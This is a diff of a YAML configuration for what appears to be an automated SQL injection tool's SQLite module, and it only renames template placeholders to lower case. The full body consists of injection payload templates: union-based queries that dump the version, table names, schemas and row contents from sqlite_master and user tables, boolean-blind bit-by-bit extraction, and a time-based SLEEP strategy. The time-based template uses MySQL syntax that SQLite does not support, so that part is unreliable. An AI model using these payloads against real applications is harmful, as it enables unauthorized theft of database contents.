@@ -3,20 +3,20 @@ resource:
  info: |
   select 
       sqlite_version()
-      || '${ENCLOSE_VALUE_SQL}'
+      || '${enclose_value_sql}'
       || 'sqlite_master'
-      || '${ENCLOSE_VALUE_SQL}'
+      || '${enclose_value_sql}'
       || 'anonymous'
-      || '${TRAIL_SQL}'
+      || '${trail_sql}'
       
  schema: 
   database: |
    select 
-       '${ENCLOSE_VALUE_SQL}'
+       '${enclose_value_sql}'
        || r
-       || '${SEPARATOR_QTE_SQL}'
+       || '${separator_qte_sql}'
        || q
-       || '${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+       || '${enclose_value_sql}${trail_sql}'
    from (
        select 
            'sqlite_master' r, 
@@ -24,57 +24,57 @@ resource:
        from sqlite_master 
        WHERE type = 'table'
    )
-   {limit}
+   ${limit}
    
   table: |
    select 
        group_concat(
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            || name
-           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}',
-           '${SEPARATOR_CELL_SQL}'
+           || '${separator_qte_sql}0${enclose_value_sql}',
+           '${separator_cell_sql}'
        )
-       || '${TRAIL_SQL}'
+       || '${trail_sql}'
    from (
        select * 
        from sqlite_master 
        WHERE type = 'table'
        ORDER BY tbl_name
-       {limit}
+       ${limit}
    )
    
   column: |
    select 
        sql
-       || '${TRAIL_SQL}'
+       || '${trail_sql}'
    from sqlite_master 
-   where tbl_name = '${TABLE}'
+   where tbl_name = '${table}'
    and type = 'table'
-   {limit}
+   ${limit}
    
   row: 
    query: |
     select 
         ifnull(
             group_concat(
-                '${ENCLOSE_VALUE_SQL}'
+                '${enclose_value_sql}'
                 || r
-                || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}',
-                '${SEPARATOR_CELL_SQL}'
+                || '${separator_qte_sql}0${enclose_value_sql}',
+                '${separator_cell_sql}'
             ),
             ''
         )
-        || '${TRAIL_SQL}'
+        || '${trail_sql}'
     from (
-        select distinct ${FIELDS} r 
-        from ${TABLE}
-        {limit}
+        select distinct ${fields} r 
+        from ${table}
+        ${limit}
     )
    fields: 
     field: |
      trim(
          ifnull(
-             ${FIELD}, 
+             ${field}, 
              ''
          )
      )
@@ -85,15 +85,15 @@ strategy:
   slidingWindow: |
    (
        select
-           '${LEAD}' 
+           '${lead}' 
            || substr(
-               (${INJECTION}), 
-               ${INDEX}, 
+               (${injection}), 
+               ${index}, 
                65536
            )
    )
-  limit: limit 65536 offset ${LIMIT}
-  failsafe: 1337${INDICE}7330%2b1
+  limit: limit 65536 offset ${limit.value}
+  failsafe: 1337${indice}7330%2b1
   calibrator: |
    replace(
        substr(
@@ -106,7 +106,7 @@ strategy:
            65536
        ),
        '0',
-       '${CALIBRATOR_SQL}'
+       '${calibrator_sql}'
    )
   limitBoundary: 0
   endingComment: --+-
@@ -115,8 +115,8 @@ strategy:
     - SQLite
     
  normal: 
-  indices: union select ${INDICES}
-  capacity: (select '${LEAD}${INDICE}' || ${CALIBRATOR})
+  indices: union select ${indices}
+  capacity: (select '${lead}${indice}' || ${calibrator})
   orderBy: order by 1337
   
  boolean: 
@@ -139,19 +139,19 @@ strategy:
    bit: |
     unicode(
         substr(
-            ${INJECTION}, 
-            ${INDEX}, 
+            ${injection}, 
+            ${index}, 
             1
         )
     ) 
-    %26 ${BIT}
-   length: length(${INJECTION}) > ${INDEX}
+    %26 ${bit}
+   length: length(${injection}) > ${index}
   modeAnd: and
   modeOr: or
-  blind: ${BOOLEAN.MODE} ${TEST}
+  blind: ${boolean.mode} ${test}
   time: |
-   ${BOOLEAN.MODE} if(
-       ${TEST}, 
+   ${boolean.mode} if(
+       ${test}, 
        1, 
-       SLEEP(${SLEEP_TIME})
+       SLEEP(${sleep_time})
    )
